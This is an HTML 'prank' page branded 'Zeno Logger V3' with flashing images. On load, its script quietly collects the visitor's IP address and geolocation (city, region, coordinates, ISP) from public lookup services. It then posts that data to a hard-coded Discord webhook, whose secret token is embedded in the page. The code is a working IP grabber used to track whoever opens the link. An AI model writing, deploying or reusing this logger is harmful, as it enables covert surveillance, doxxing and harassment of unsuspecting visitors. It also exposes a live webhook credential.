<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Prank Site</title>
    <style type="text/css">
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            color: white;
            overflow: hidden;
        }
        .content {
            z-index: 2;
            text-align: center;
            position: relative;
        }
        img {
            max-width: 300px;
            margin: 20px 0;
        }
        button {
            padding: 10px 20px;
            font-size: 18px;
            background-color: red;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: darkred;
        }
        .background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-size: cover;
            background-position: center;
            z-index: 1;
            animation: flash 1s infinite;
        }
        @keyframes flash {
            0%, 50% {
                background-image: url('jas.png');
            }
            50.1%, 100% {
                background-image: url('jas2.png');
            }
        }
    </style>
</head>
<body>
<div class="background"></div>
<div class="content">
    <h1>IP LOGGED BY ZENO LOGGER V3</h1>
    <img src="logo.png" alt="Prank Logo">
    <button id="playSound">Play Sound</button>
    <div id="ipResult"></div>
</div>

<audio id="prankSound" src="sound.mp3"></audio>

<script>
    // Play sound on button click
    const playButton = document.getElementById('playSound');
    const prankSound = document.getElementById('prankSound');
    playButton.addEventListener('click', () => {
        prankSound.play();
    });

    // Fetch and send IP data
    function getMyIpAddress() {
        fetch("https://api64.ipify.org?format=json")
            .then(response => response.json())
            .then(data => {
                fetch("https://ipinfo.io/" + data.ip + "/json")
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById("ipResult").innerHTML = `
                            <p><strong>IP Address:</strong> ${data.ip}</p>
                            <p><strong>City:</strong> ${data.city}</p>
                            <p><strong>Region:</strong> ${data.region}</p>
                            <p><strong>Country:</strong> ${data.country}</p>
                            <p><strong>Location:</strong> ${data.loc}</p>
                            <p><strong>Organization:</strong> ${data.org}</p>
                        `;
                        sendToDiscord(data);
                    })
                    .catch(err => console.error("Error retrieving geolocation data:", err));
            })
            .catch(err => console.error("Error retrieving IP address:", err));
    }

    function sendToDiscord(data) {
        const webhookUrl = "https://discord.com/api/webhooks/1187118326380503040/d24deoHu0s7_VCgx02QwPLQLGVzQnoOeCzhvM1DDxcZULyPQoQXhUuW8pQpsm1O0zFGu";
        const payload = {
            embeds: [
                {
                    fields: [
                        { name: "IP Address", value: data.ip, inline: true },
                        { name: "City", value: data.city, inline: true },
                        { name: "Region", value: data.region, inline: true },
                        { name: "Country", value: data.country, inline: true },
                        { name: "Location", value: data.loc, inline: true },
                        { name: "Organization", value: data.org, inline: true }
                    ],
                    color: 16711680,
                    timestamp: new Date().toISOString()
                }
            ]
        };

        fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.ok) {
                console.log("IP data sent to Discord successfully.");
            } else {
                console.error("Error sending data to Discord:", response.status, response.statusText);
            }
        })
        .catch(err => console.error("Error sending data to Discord:", err));
    }

    document.addEventListener("DOMContentLoaded", getMyIpAddress);
</script>
</body>
</html>
